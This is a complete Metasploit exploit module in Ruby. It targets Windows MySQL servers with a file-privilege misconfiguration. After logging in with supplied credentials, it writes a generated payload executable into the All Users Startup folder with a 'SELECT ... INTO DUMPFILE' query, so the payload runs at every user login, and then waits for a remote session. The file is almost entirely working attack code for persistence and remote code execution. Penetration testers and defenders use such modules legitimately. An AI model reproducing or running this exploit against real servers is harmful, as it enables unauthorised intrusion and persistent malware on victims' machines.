##
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::MYSQL
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle MySQL for Microsoft Windows File Write',
      'Description'    => %q{
          This module takes advantage of a file privilege misconfiguration problem
        specifically against Windows MySQL servers. This module writes a payload to
        Microsoft's All Users Start Up directory which will execute every time a
        user logs in.
      },
      'Author'         =>
        [
          'sinn3r',
          'Sean Verity <veritysr1980[at]gmail.com'
        ],
      'DefaultOptions' =>
        {
          'InitialAutoRunScript' => "migrate -f"
        },
      'License'        => MSF_LICENSE,
      'References'     =>
        [
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'MySQL on Windows', { } ]
        ],
      'DefaultTarget'  => 0,
    ))

    register_options(
      [
        OptString.new('USERNAME', [ true, 'The username to authenticate as']),
        OptString.new('PASSWORD', [ true, 'The password to authenticate with'])
      ])
    register_advanced_options(
      [
        OptBool.new('ExitOnSession', [ true, 'Turn off handler once session is created', true])
      ])
  end

  def check
    m = mysql_login(datastore['USERNAME'], datastore['PASSWORD'])
    return Exploit::CheckCode::Safe if not m

    return Exploit::CheckCode::Appears if is_windows?
    return Exploit::CheckCode::Safe
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def query(q)
    rows = []

    begin
      res = mysql_query(q)
      return rows if not res
      res.each_hash do |row|
        rows << row
      end
    rescue RbMysql::ParseError
      return rows
    end

    return rows
  end

  def is_windows?
    r = query("SELECT @@version_compile_os;")
    return (r[0]['@@version_compile_os'] =~ /^Win/) ? true : false
  end

  def get_drive_letter
    r = query("SELECT @@tmpdir;")
    drive = r[0]['@@tmpdir'].scan(/^(\w):/).flatten[0] || ''
    return drive
  end

  def upload_file(bin, dest)
    p = bin.unpack("H*")[0]
    query("SELECT 0x#{p} into DUMPFILE '#{dest}'")
  end

  def exploit
    if not datastore['ExitOnSession'] and not job_id
      fail_with(Exploit::Failure::Unknown, "Setting ExitOnSession to false requires running as a job (exploit -j)")
    end

    print_status("#{peer} - Attempting to login as '#{datastore['USERNAME']}:#{datastore['PASSWORD']}'")
    begin
      m = mysql_login(datastore['USERNAME'], datastore['PASSWORD'])
      return if not m
    rescue RbMysql::AccessDeniedError
      print_error("#{peer} - Access denied.")
      return
    end

    if not is_windows?
      print_error("#{peer} - Remote host isn't Windows.")
      return
    end

    drive    = get_drive_letter
    exe_name = Rex::Text::rand_text_alpha(5) + ".exe"
    dest     = "#{drive}:/programdata/microsoft/windows/start menu/programs/startup/#{exe_name}"
    exe      = generate_payload_exe
    print_status("#{peer} - Uploading to '#{dest}'")
    begin
      upload_file(exe, dest)
      register_file_for_cleanup("#{dest}")
    rescue RbMysql::AccessDeniedError
      print_error("#{peer} - No permission to write. I blame kc :-)")
      return
    end

    stime = Time.now.to_f
    while(true)
      break if session_created? and datastore['ExitOnSession']
      break if ( datastore['ListenerTimeout'].to_i > 0 and (stime + datastore['ListenerTimeout'].to_i < Time.now.to_f) )
      select(nil,nil,nil,1)
    end
  end

end
